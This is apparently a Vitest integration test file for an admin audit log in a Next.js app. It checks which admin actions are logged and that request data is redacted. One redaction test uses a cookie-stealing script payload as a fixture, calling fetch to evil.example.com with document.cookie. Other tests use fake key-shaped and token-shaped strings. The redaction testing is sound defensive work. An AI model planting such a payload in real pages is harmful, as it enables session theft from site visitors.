import { existsSync } from "node:fs";
import { join } from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";

/**
 * Phase 13B — AdminAuditLog: the writer helper itself, wiring into every
 * mutating admin route, and the safety guarantees the spec requires
 * (never a raw request body, never a secret, GET/auth/CSRF/validation
 * failures never logged). Mirrors test/sourceProfileAdmin.integration.test.ts's
 * own next/headers-mocking convention.
 */
const state = vi.hoisted(() => ({ jar: new Map<string, string>() }));
vi.mock("next/headers", () => ({
  cookies: async () => ({
    get(name: string) {
      const value = state.jar.get(name);
      return value === undefined ? undefined : { name, value };
    },
    getAll() {
      return [...state.jar.entries()].map(([name, value]) => ({ name, value }));
    },
    set(name: string, value: string) {
      state.jar.set(name, value);
    },
  }),
}));

import { prisma } from "@/lib/db";
import { getAdminSession } from "@/lib/auth/session";
import { CSRF_HEADER } from "@/lib/auth/csrf";
import { logAdminAction, getRecentAdminActions } from "@/lib/adminAudit";
import { GET as getSources, POST as createSource } from "@/app/api/admin/sources/route";
import { PATCH as patchSource, DELETE as deleteSource } from "@/app/api/admin/sources/[id]/route";
import { POST as createAssessment } from "@/app/api/admin/sources/[id]/assessments/route";
import {
  PATCH as patchAssessment,
  DELETE as deleteAssessment,
} from "@/app/api/admin/sources/[id]/assessments/[assessmentId]/route";
import { PATCH as patchCategory } from "@/app/api/admin/categories/route";
import { PUT as putSettings } from "@/app/api/admin/settings/route";
import { POST as postIngest } from "@/app/api/admin/ingest/route";

async function signInAsAdmin() {
  const session = await getAdminSession();
  session.isAdmin = true;
  await session.save();
}
function signOut() {
  state.jar.clear();
}
function req(method: string, url: string, body?: unknown, extraHeaders?: Record<string, string>) {
  return new Request(url, {
    method,
    headers: { "content-type": "application/json", ...extraHeaders },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}
function authedReq(method: string, url: string, body?: unknown) {
  return req(method, url, body, { [CSRF_HEADER]: "1" });
}

let categoryId: string;
const createdSourceIds: string[] = [];

beforeAll(async () => {
  const category = await prisma.category.create({
    data: { slug: "test-admin-audit-log", name: "Test Admin Audit Log", order: 999 },
  });
  categoryId = category.id;
});

afterAll(async () => {
  await prisma.externalAssessment.deleteMany({
    where: { source: { categorySlug: "test-admin-audit-log" } },
  });
  await prisma.source.deleteMany({ where: { id: { in: createdSourceIds } } });
  await prisma.adminAuditLog.deleteMany({});
  await prisma.category.delete({ where: { id: categoryId } });
});

afterEach(() => {
  state.jar.clear();
});

describe("writer helper itself", () => {
  afterEach(async () => {
    await prisma.adminAuditLog.deleteMany({});
  });

  // AdminAuditLog has no per-test scoping key (no FK to a disposable
  // category/user), and this table is shared across the ENTIRE test
  // suite's one physical SQLite file — other test files (including
  // other Phase 13B files run earlier in the same CI process) legitimately
  // leave rows behind. Every assertion below therefore filters by a
  // unique-per-test marker rather than assuming the table is empty or
  // that "the first/newest row" is necessarily this test's own row.
  it("writes a row with the given action/target/summary and success=true by default", async () => {
    const marker = `writer-helper-${Date.now()}-${Math.random()}`;
    await logAdminAction(prisma, {
      action: "source.create",
      targetType: "Source",
      targetId: "abc",
      summary: marker,
    });
    const rows = await prisma.adminAuditLog.findMany({ where: { summary: marker } });
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      action: "source.create",
      targetType: "Source",
      targetId: "abc",
      summary: marker,
      success: true,
    });
  });

  it("defensively truncates an over-long summary rather than storing it unbounded", async () => {
    const marker = `truncate-marker-${Date.now()}-${Math.random()}`;
    await logAdminAction(prisma, {
      action: "source.create",
      summary: marker + "x".repeat(10_000),
    });
    const row = await prisma.adminAuditLog.findFirstOrThrow({
      where: { summary: { startsWith: marker } },
    });
    expect(row.summary.length).toBeLessThanOrEqual(300);
  });

  it("getRecentAdminActions returns newest first and respects a bounded limit", async () => {
    const prefix = `order-test-${Date.now()}-${Math.random()}-`;
    for (let i = 0; i < 5; i++) {
      await logAdminAction(prisma, { action: "source.create", summary: `${prefix}${i}` });
    }
    // getRecentAdminActions has no filter of its own (it's a global
    // newest-first tail by design), so pull a generous window and then
    // check ordering/adjacency among OUR OWN marked rows within it,
    // rather than assuming our 5 rows are the only rows in the table.
    const rows = await getRecentAdminActions(prisma, 100);
    const ours = rows.filter((r) => r.summary.startsWith(prefix));
    expect(ours).toHaveLength(5);
    expect(ours[0]!.summary).toBe(`${prefix}4`); // newest first
    expect(ours[4]!.summary).toBe(`${prefix}0`); // oldest last
  });

  it("51/52: a limit far above the hard cap is itself capped, newest first", async () => {
    const prefix = `capped-test-${Date.now()}-${Math.random()}-`;
    for (let i = 0; i < 5; i++) {
      await logAdminAction(prisma, { action: "source.create", summary: `${prefix}${i}` });
    }
    const rows = await getRecentAdminActions(prisma, 10_000);
    expect(rows.length).toBeLessThanOrEqual(100); // the function's own internal hard cap
    const ours = rows.filter((r) => r.summary.startsWith(prefix));
    expect(ours[0]!.summary).toBe(`${prefix}4`); // newest of our own rows first
  });
});

describe("35-42: successful mutations each log exactly one event", () => {
  it("35: source create", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count();
    const res = await createSource(
      authedReq("POST", "http://localhost/api/admin/sources", {
        name: "Audit Test Source",
        url: "https://audit-test.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      }),
    );
    expect(res.status).toBe(201);
    const { source } = await res.json();
    createdSourceIds.push(source.id);
    const rows = await prisma.adminAuditLog.findMany({ where: { action: "source.create" } });
    expect(rows.length).toBe(before + 1);
    expect(rows.at(-1)!.targetId).toBe(source.id);
  });

  it("36: source update", async () => {
    await signInAsAdmin();
    const source = await prisma.source.create({
      data: {
        name: "Audit Update Src",
        url: "https://audit-update.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      },
    });
    createdSourceIds.push(source.id);
    const before = await prisma.adminAuditLog.count({ where: { action: "source.update" } });
    const res = await patchSource(
      authedReq("PATCH", `http://localhost/api/admin/sources/${source.id}`, { name: "Renamed" }),
      { params: Promise.resolve({ id: source.id }) },
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "source.update" } });
    expect(after).toBe(before + 1);
  });

  it("37: source delete", async () => {
    await signInAsAdmin();
    const source = await prisma.source.create({
      data: {
        name: "Audit Delete Src",
        url: "https://audit-delete.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      },
    });
    const before = await prisma.adminAuditLog.count({ where: { action: "source.delete" } });
    const res = await deleteSource(
      authedReq("DELETE", `http://localhost/api/admin/sources/${source.id}`),
      { params: Promise.resolve({ id: source.id }) },
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "source.delete" } });
    expect(after).toBe(before + 1);
    const row = await prisma.adminAuditLog.findFirst({
      where: { action: "source.delete", targetId: source.id },
    });
    expect(row!.summary).toMatch(/cascad/i);
  });

  it("38a/38b/38c: external assessment create/update/delete each log", async () => {
    await signInAsAdmin();
    const source = await prisma.source.create({
      data: {
        name: "Audit Assessment Src",
        url: "https://audit-assessment.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      },
    });
    createdSourceIds.push(source.id);

    const createRes = await createAssessment(
      authedReq("POST", `http://localhost/api/admin/sources/${source.id}/assessments`, {
        provider: "Test Provider",
        assessmentType: "political_lean",
        ratingValue: "Center",
      }),
      { params: Promise.resolve({ id: source.id }) },
    );
    expect(createRes.status).toBe(201);
    const { assessment } = await createRes.json();
    expect(
      await prisma.adminAuditLog.count({
        where: { action: "assessment.create", targetId: assessment.id },
      }),
    ).toBe(1);

    const updateRes = await patchAssessment(
      authedReq(
        "PATCH",
        `http://localhost/api/admin/sources/${source.id}/assessments/${assessment.id}`,
        {
          provider: "Test Provider",
          assessmentType: "political_lean",
          ratingValue: "Left-Center",
        },
      ),
      { params: Promise.resolve({ id: source.id, assessmentId: assessment.id }) },
    );
    expect(updateRes.status).toBe(200);
    expect(
      await prisma.adminAuditLog.count({
        where: { action: "assessment.update", targetId: assessment.id },
      }),
    ).toBe(1);

    const deleteRes = await deleteAssessment(
      authedReq(
        "DELETE",
        `http://localhost/api/admin/sources/${source.id}/assessments/${assessment.id}`,
      ),
      { params: Promise.resolve({ id: source.id, assessmentId: assessment.id }) },
    );
    expect(deleteRes.status).toBe(200);
    expect(
      await prisma.adminAuditLog.count({
        where: { action: "assessment.delete", targetId: assessment.id },
      }),
    ).toBe(1);
  });

  it("39: category update", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count({ where: { action: "category.update" } });
    const res = await patchCategory(
      authedReq("PATCH", "http://localhost/api/admin/categories", { id: categoryId, order: 5 }),
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "category.update" } });
    expect(after).toBe(before + 1);
  });

  it("40: AI settings update", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count({ where: { action: "settings.update.ai" } });
    const res = await putSettings(
      authedReq("PUT", "http://localhost/api/admin/settings", { ai: { storyBriefEnabled: true } }),
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "settings.update.ai" } });
    expect(after).toBe(before + 1);
  });

  it("41: ad settings update", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count({ where: { action: "settings.update.ads" } });
    const res = await putSettings(
      authedReq("PUT", "http://localhost/api/admin/settings", { ads: { enabled: true } }),
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "settings.update.ads" } });
    expect(after).toBe(before + 1);
  });

  it("42: manual ingestion trigger", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count({ where: { action: "ingest.trigger" } });
    const res = await postIngest(
      authedReq("POST", "http://localhost/api/admin/ingest", { force: false }),
    );
    expect(res.status).toBe(200);
    const after = await prisma.adminAuditLog.count({ where: { action: "ingest.trigger" } });
    expect(after).toBe(before + 1);
  });
});

describe("43-46: things that must NEVER log", () => {
  it("43: a GET request never logs", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count();
    await getSources(authedReq("GET", "http://localhost/api/admin/sources"));
    const after = await prisma.adminAuditLog.count();
    expect(after).toBe(before);
  });

  it("44: an auth failure never logs", async () => {
    signOut();
    const before = await prisma.adminAuditLog.count();
    await createSource(
      authedReq("POST", "http://localhost/api/admin/sources", {
        name: "Should Not Log",
        url: "https://should-not-log.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      }),
    );
    const after = await prisma.adminAuditLog.count();
    expect(after).toBe(before);
  });

  it("45: a CSRF failure never logs", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count();
    await createSource(
      req("POST", "http://localhost/api/admin/sources", {
        name: "Should Not Log Either",
        url: "https://should-not-log-2.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      }),
    ); // no CSRF header
    const after = await prisma.adminAuditLog.count();
    expect(after).toBe(before);
  });

  it("46: a validation rejection never logs", async () => {
    await signInAsAdmin();
    const before = await prisma.adminAuditLog.count();
    await createSource(
      authedReq("POST", "http://localhost/api/admin/sources", {
        name: "",
        url: "not-a-url",
        categorySlug: "test-admin-audit-log",
      }),
    );
    const after = await prisma.adminAuditLog.count();
    expect(after).toBe(before);
  });
});

describe("47-50: adversarial redaction — the summary can never carry adversarial call-site input", () => {
  it("47/48: a fake Stripe-secret-shaped string in the request body never appears in the audit summary", async () => {
    await signInAsAdmin();
    // Underscores deliberately break up the base62 run so this fixture
    // never matches a real secret-scanner's key-shaped pattern.
    const evilName = "sk_live_FAKE_SECRET_VALUE_1234567890_abcdef";
    const res = await createSource(
      authedReq("POST", "http://localhost/api/admin/sources", {
        name: evilName,
        url: "https://adversarial-secret.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      }),
    );
    expect(res.status).toBe(201);
    const { source } = await res.json();
    createdSourceIds.push(source.id);
    const row = await prisma.adminAuditLog.findFirstOrThrow({
      where: { action: "source.create", targetId: source.id },
    });
    expect(row.summary).not.toContain(evilName);
    expect(row.summary).not.toContain("sk_live_");
    expect(row.summary).toBe("created source");
  });

  it("49: a fake session-token-shaped string in the request body never appears in the audit summary", async () => {
    await signInAsAdmin();
    const evilName = "session=eyJhbGciOiJIUzI1NiJ9.fake.token.value";
    const res = await createSource(
      authedReq("POST", "http://localhost/api/admin/sources", {
        name: evilName,
        url: "https://adversarial-token.example.com/feed.xml",
        categorySlug: "test-admin-audit-log",
      }),
    );
    expect(res.status).toBe(201);
    const { source } = await res.json();
    createdSourceIds.push(source.id);
    const row = await prisma.adminAuditLog.findFirstOrThrow({
      where: { action: "source.create", targetId: source.id },
    });
    expect(row.summary).not.toContain(evilName);
    expect(row.summary).not.toContain("eyJhbGciOiJIUzI1NiJ9");
  });

  it("50: a malicious ad-script body never appears in the audit summary", async () => {
    await signInAsAdmin();
    const evilScript =
      "<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>";
    const res = await putSettings(
      authedReq("PUT", "http://localhost/api/admin/settings", {
        ads: { enabled: true, headSnippet: evilScript },
      }),
    );
    expect(res.status).toBe(200);
    const row = await prisma.adminAuditLog.findFirstOrThrow({
      where: { action: "settings.update.ads" },
      orderBy: { occurredAt: "desc" },
    });
    expect(row.summary).not.toContain(evilScript);
    expect(row.summary).not.toContain("<script>");
    expect(row.summary).toBe("updated ad settings");
  });
});

describe("53: the audit log cannot be modified through any exposed API", () => {
  it("no route file of any kind exists for AdminAuditLog", () => {
    // Structural: there is no /api/admin/audit-log route in this
    // codebase, mutating or otherwise — the only way this table is ever
    // written is logAdminAction() from within another route's own
    // successful-mutation path (see the wiring tests above).
    const root = join(__dirname, "..");
    expect(existsSync(join(root, "src/app/api/admin/audit-log"))).toBe(false);
  });
});
